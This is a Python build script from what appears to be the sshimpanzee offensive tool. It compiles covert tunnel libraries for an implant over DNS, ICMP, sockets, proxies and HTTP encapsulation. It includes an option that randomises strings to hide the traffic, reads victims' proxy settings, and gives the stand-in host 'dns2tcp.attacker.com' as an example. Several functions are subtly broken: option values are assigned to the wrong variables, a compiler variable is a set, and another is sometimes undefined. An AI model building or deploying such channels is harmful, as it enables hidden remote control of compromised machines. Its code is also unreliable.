from src.cmd  import run_cmd
from src.args import args
import os.path
import sys
import random
import string
import hashlib

key_charset =  string.ascii_letters + string.digits

def _clean():
    if os.path.exists("tuns/libtun.a"):
        os.unlink("tuns/libtun.a")

def dns(opt):
    print("[*] Patching and building dns2tcp client...")
    dns_name = None
    key = "sshimpanzee"
    res = "sshimpanzee"
    qtype = "TXT"
    resolver = None
    obf = False
    buildserv = False
    _clean()
    for i in opt:
        parsed=i.split("=")
        if parsed[0] == "dnsserv":
            dns_name = parsed[1]
        elif parsed[0] == "key":
            key = parsed[1]
        elif parsed[0] == "res":
            res = parsed[1]
        elif parsed[0] == "qtype":
            qtype = parsed[1]
        elif parsed[0] == "resolver":
            resolver = parsed[1]
        elif parsed[0] == "obfuscate":
            obf = True
        elif parsed[0] == "buildserv":
            buildserv = True
        
    if dns_name == None:
        print("[-] please provide dns options such as --tun dns,dnsserv=dns2tcp.attacker.com")
        sys.exit(-1)
        
    if args.cross_comp:
        CC = "CC=gcc"
    else:
        CC = f"CC={args.compiler}"

    obf_str = ""
    if obf:
        auth = "".join(random.choices(string.ascii_lowercase, k=len("auth")))
        resource = "".join(random.choices(string.ascii_lowercase, k=len("resource")))
        connect = "".join(random.choices(string.ascii_lowercase, k=len("connect")))
        obf_str = f'-DCUSTOM_STRINGS -DRESOURCE="\\"={resource}.\\"" -DCONNECT="\\"={connect}.\\"" -DAUTH="\\"={auth}.\\""'
        buildserv = True
        
    resolver = f"-DDNS2TCP_RESOLVER=\"\\\"{resolver}\\\"\"" if resolver else ""
    defines = f'-DDNSSERV=\"\\\"{dns_name}\\\"\" -DDNS2TCP_KEY=\"\\\"{key}\\\"\" -DDNS2TCP_RES=\"\\\"{res}\\\"\" -DDNS2TCP_QUERY_FUNC=\"\\\"{qtype}\\\"\" {resolver} {obf_str}'
    host = "" 
    if args.cross_comp:
        host = f"--host {args.cross_comp}" 
        
    cmd = f"cd  tuns/dns2tcp; ./configure  {host} LDFLAGS={args.extra_ldflags} CFLAGS='{args.extra_cflags} {defines}'; git apply ../patchs/patch_dns2tcp.patch;"
    run_cmd(cmd)
    
    cmd = f"cd tuns/dns2tcp; make clean; gcc common/debug.c -c -o client/debug.o; cd client; make;"
    run_cmd(cmd)
    print("[+] Client lib and server built") 

    cmd = "cd tuns/dns2tcp/client; ar rcs ../../../build/libtun.a *.o"
    if run_cmd(cmd) or not os.path.exists("build/libtun.a"):
        print("[-] Failed building dns2tcp lib.")
        sys.exit(-1)
    else:
        print("[+] Build successfull")

    if buildserv:
        cmd = f"cd tuns/dns2tcp; make clean; gcc common/debug.c -c -o server/debug.o; cd server; make; gcc -Wall -Wunused -o dns2tcpd hmac_sha1.o crc16.o rr.o mycrypto.o session.o queue.o config.o myrand.o auth.o requests.o server.o list.o dns.o dns_decode.o mystrnlen.o memdump.o base64.o socket.o options.o main.o debug.o"
        if run_cmd(cmd):
            print("[-] Failed to build server.")
        else:
            print("[+] Server has been built.")
            os.replace("tuns/dns2tcp/server/dns2tcpd", "build/dns2tcpd")
    return 
            
def icmp(opt):
    print("[*] Patching and building ICMPTunnel client...")
    _clean()
    cmd = "cd tuns/icmptunnel/; make clean && git apply ../patchs/patch_icmptunnel.patch;"
    run_cmd(cmd)
    
    remote = None
    raw = False
    for i in opt:
        if i=="raw_sock":
            raw = True
        parsed=i.split("=")
        if parsed[0] == "remote" and len(parsed) == 2:
            remote = parsed[1]
    if remote == None:
        print("[-] please provide a remote adresse to connect to: icmp,remote=127.0.0.1")
        sys.exit(0)
    CC = ""
    if args.cross_comp:
        CC = f"CC={args.compiler}"
    else:
        CC = f"CC=gcc"
        compiler="gcc"
        
    raw = "-DNO_ROOT" if not raw else ""
        

    cmd = f"cd tuns/icmptunnel && gcc client.c icmp.c tunnel.c {raw} -DDEST='\"{remote}\"' -c;"
    if run_cmd(cmd):
        print("[+] Failed to compile icmptunnel, check for missing value")    
    cmd = "cd tuns/icmptunnel; ar rcs ../../build/libtun.a client.o icmp.o tunnel.o";    
    if run_cmd(cmd) or not os.path.exists("build/libtun.a"):
        print("[-] Failed building icmptunnel lib.")
        sys.exit(-1)
    
    if "buildserv" in opt:
        cmd = f"cd tuns/icmptunnel && make clean && {compiler} icmptunnel.c icmp.c tunnel.c -o icmptunnel"
        if not run_cmd(cmd) and os.path.exists("tuns/icmptunnel/icmptunnel"):
            os.replace("tuns/icmptunnel/icmptunnel", "build/icmptunnel")
            print("[+] icmptunnel bin has been built.")
            
        else:
            print("[-] Failed to build icmptunnel server")
            sys.exit(-1)
    print("[+] Build successfull")


        
def sock(opt):
    print("[*] Building socket-reuse client...")
    _clean()
    path = "/tmp/socket"
    mode = "connect"
    t = "unix"
    ip = "127.0.0.1"
    port = "2222"
    for i in opt:
        parsed=i.split("=")
        if len(parsed) == 2:
            if parsed[0] == "path":
                path = parsed[1]
            if parsed[0] == "mode":
                mode = parsed[1]
            if parsed[0] == "type":
                t = parsed[1]
            if parsed[0] == "ip":
                t = parsed[1]
            if parsed[0] == "port":
                t = parsed[1]

    defines = f" -DUNIXSOCK_PATH='\"{path}\"'"
    
    if t == "tcp":
        print(f"\t--> Building socket support with TCP {mode} : {ip}:{port}") 
        defines += f" -DIP_ADDR='\"{ip}\"' -DTCP_PORT={port}"
    elif t == "unix":
        print(f"-> Building socket support with Unix {mode} : {path}")
        defines += f" -DUNIXSOCK_PATH='\"{path}\"'"
        defines += f" -DUNIX_MODE"
    else:
        print("[-] Socket type not supported, supported types are unix, tcp ")
        sys.exit(-1)
        
    if mode == "listen":
        defines += " -DLISTEN_MODE" 
    elif mode == "connect":
        pass
    else:
        print("[-] Socket mode not supported, supported modes are connect, listen ")
        sys.exit(-1)

    if mode == "connect" and t == "tcp":
        print("/!\\ Seems like you do not really need a tunnel, just specify the -r argument...") 
        
    if args.musl:
        CC = "musl-gcc"
    else:
        CC = {args.compiler}
    cmd = f"cd tuns/sock/; rm -f sock.o; {CC} {defines} sock.c -c -o sock.o;"
    
    if run_cmd(cmd):
        print("[-] Fail compiling.")
    cmd = "cd tuns/sock/; ar rcs ../../build/libtun.a sock.o"
    if run_cmd(cmd) or not os.path.exists("build/libtun.a"):
        print("[-] Failed building sock lib.")
        sys.exit(-1)
    else:
        print("[+] Build successfull")



    
def proxysock(opt):
    print("[*] Building proxysock lib...")
    _clean()
    defines = ""
    phost = None
    pport = None
    puser = None
    ppass = None
    ptype = None
    auto = False
    for i in opt:
        parsed=i.split("=")
        if len(parsed) == 2:
            if parsed[0] == "phost":
                phost = parsed[1]
            elif parsed[0] == "pport":
                pport = parsed[1]
            elif parsed[0] == "puser":
                puser = parsed[1]
            elif parsed[0] == "ppass":
                ppass = parsed[1]
            elif parsed[0] == "ptype":
                ptype = parsed[1]
        if parsed[0] == "env":
            auto = True

    if  not auto and phost == None:
        print("[-] Please provide phost argument")
        sys.exit(-1)
    if not auto and pport == None:
        print("[-] Please provide pport argument")
        sys.exit(-1)
    if not auto and (not ptype or ptype not in ["HTTP", "SOCKS4", "SOCKS5"]) :
        print("[-] Please provide ptype argument among HTTP|SOCKS4|SOCKS5")
        sys.exit(-1)


    if not args.remote or not len(args.remote.split(':'))==2:
        print("[-] Please provide a remote adresse using -r  ")
        sys.exit(-1)

    if auto:
        defines += '-DAUTO '
        
    if  puser != None and ppass != None :
        defines += f"-DPUSER='\"{puser}\"' "
        defines += f"-DPPASS='\"{ppass}\"' "
        
    elif puser != None or ppass != None:
        print("[-] Please provice puser AND ppass argument")
        
    if not auto:
        defines += f"-DPHOST='\"{phost}\"' "
        defines += f"-DPPORT={pport} "
        defines += f"-DPTYPE='\"{ptype}\"' "
    else:
        print("[+] Proxy type set to auto, sshimpanzee will parse victim http_proxy/https_proxy env varto get its configuration")

    
    defines += f"-DDST_HOST='\"{args.remote.split(':')[0]}\"' "
    defines += f"-DDST_PORT='{args.remote.split(':')[1]}' "
    
    cmd = f"cd tuns/proxysocket/; rm -rf tunnel.o proxysock.o;  git apply ../patchs/patch_proxysocket.patch;"
    if run_cmd(cmd):
        print("[-] Failed to apply patchs")
        
    cmd = f"cd tuns/proxysocket; {args.compiler} {defines} -Iinclude/ -Isrc/ examples/tunnel.c -c -o tunnel.o && {args.compiler} -Isrc/ -Iinclude/ src/proxysocket.c -c -o proxysock.o"
    if run_cmd(cmd):
        print("[-] Failed to build proxysock")

    cmd = "cd tuns/proxysocket; ar rcs ../../build/libtun.a proxysock.o tunnel.o"
    if  run_cmd(cmd) or not os.path.exists("build/libtun.a"):
        print("[-] Failed building proxysocklib lib.")
        sys.exit(-1)
    else:
        print("[+] Build successfull")



def http_enc(opt):
    _clean()
    target = "php"
    key = None
    path_fd = "/dev/shm/fd"
    for i in opt:
        parsed=i.split("=")
        if len(parsed) == 2:
            if parsed[0] == "key":
                key = parsed[1]
            elif parsed[0] == "target":
                target = parsed[1]
            elif parsed[0] == "path_fd":
                path_fd = parsed[1]

    cmd = f"cd tuns/http_enc/;rm -f demux.o; {args.compiler} -DFIFO_IN='\"{path_fd}_in\"' -DFIFO_OUT='\"{path_fd}_out\"' -c -o demux.o demux.c"

    if run_cmd(cmd):
        print("[-] Failed to build")

    if key == None:
        print("[+] No key specified, generating one:")
        key = ''.join(random.choice(key_charset) for i in range(24))
        print("\-> Use : "+key)
        
    print("[+] Generating target script")
    with open(f"tuns/http_enc/proxies/proxy.{target}", "r") as r:
        with open(f"build/proxy.{target}", "w") as w:
            for line in r.readlines():
                if '[PATH_FD]' in line:
                    line = line.replace("[PATH_FD]",path_fd)
                if '[HASHED_KEY]' in line:
                    line = line.replace("[HASHED_KEY]",hashlib.md5(key.encode()).hexdigest())
                w.write(line)
                
    
    cmd = f"cd tuns/http_enc/; ar rcs ../../build/libtun.a demux.o"
    if  run_cmd(cmd) or not os.path.exists("build/libtun.a"):
        print("[-] Failed building http encapsulation lib.")
        sys.exit(-1)
    else:
        print("[+] Build successfull")


def no_build(opt):
    path = None
    for i in opt:
        parsed=i.split("=")
        if len(parsed) == 2:
            if parsed[0] == "path":
                path = parsed[1]

    if not path or not os.path.exists(path):
        print("[-] Please specify a path argument pointing to your libtun.a")
        exit(-1)
    print("[*] Not building a tunnel")     
    return

def help():
    print("""Complete list of supported tunnels:
    - dns,dnsserv=<tld running dns2tcpd>,[qtype=[QTYPE{TXT}],resolver=[DNS resolver],resource=[resource name as defined in dns2tcp {sshimpanzee}],key=[dns2tcp key {sshimpanzee}],[obfuscate],[buildserv]]
    - sock,[mode=<listen,connect>,type=<unix,tcp>,ip=[ip],port=[port],path=[socket unix path]]
    - proxysock,[ptype=<HTTP,SOCKS4,SOCKS5>,phost=[Proxy Host],pport=[Proxy Port],puser=[username for proxy authentication],ppass=[Pass for proxy authentication],env]
    - icmp,[remote=[IP],raw_sock,buildserv]
    - http_enc
    - no_build,path=<path to custom libtun.a>
    """)
    exit(0)
